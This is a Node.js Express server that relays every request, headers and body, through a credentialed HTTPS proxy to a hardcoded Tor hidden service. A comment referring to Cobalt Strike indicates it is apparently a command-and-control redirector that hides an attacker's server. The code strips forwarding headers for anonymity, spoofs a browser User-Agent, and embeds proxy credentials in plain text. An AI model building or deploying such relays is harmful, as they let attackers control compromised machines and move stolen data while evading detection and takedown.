const express = require('express');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

// Initialize Express app
const app = express();
const PORT = process.env.PORT || 10000;

// Tor HTTPS proxy configuration
const proxyUrl = 'https://mixtura:mixtura@ep01.goodextensions.mooo.com:443';
const proxyAgent = new HttpsProxyAgent(proxyUrl);

// Target Tor hidden service
const onionUrl = 'http://ttcbgkpnl6at7dqhroa2shu44zqxzpwwwvdxbzoqznxk7lg5xso6bbqd.onion';

// Middleware to parse JSON and URL-encoded bodies
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Health check endpoint for hosting platform
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'OK' });
});

// Route to handle all requests
app.all('/*', async (req, res) => {
  let targetUrl; // Declare targetUrl in outer scope
  try {
    // Construct the full URL for the hidden service
    const targetPath = req.originalUrl;
    targetUrl = `${onionUrl}${targetPath}`;
    
    console.log(`Forwarding request: ${req.method} ${targetUrl}`);
    console.log('Request headers:', req.headers);

    // Forward the request to the Tor hidden service
    const response = await axios({
      method: req.method,
      url: targetUrl,
      headers: {
        ...req.headers,
        host: new URL(onionUrl).host, // Set correct host for .onion
        'X-Forwarded-For': undefined, // Remove for anonymity
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        // Uncomment and add API key if required by Cobalt Strike
        // 'Authorization': 'Bearer YOUR_API_KEY',
      },
      data: req.body,
      proxy: false, // Disable axios default proxy
      httpAgent: proxyAgent,
      httpsAgent: proxyAgent,
      timeout: 90000, // 90s timeout for Tor network
      validateStatus: (status) => status >= 200 && status < 600, // Capture all status codes
    });

    console.log(`Response received: ${response.status} ${response.statusText}`);
    console.log('Response headers:', response.headers);
    console.log('Response data:', response.data);

    // Forward response headers and status
    res.status(response.status);
    Object.entries(response.headers).forEach(([key, value]) => {
      res.setHeader(key, value);
    });

    // Send response data
    res.send(response.data);
  } catch (error) {
    console.error('Proxy Error:', {
      message: error.message,
      code: error.code,
      responseStatus: error.response?.status,
      responseHeaders: error.response?.headers,
      responseData: error.response?.data,
      requestUrl: targetUrl,
    });
    res.status(error.response?.status || 500).json({
      error: 'Internal Server Error',
      message: error.message,
      details: error.response?.data || 'No additional details available',
    });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
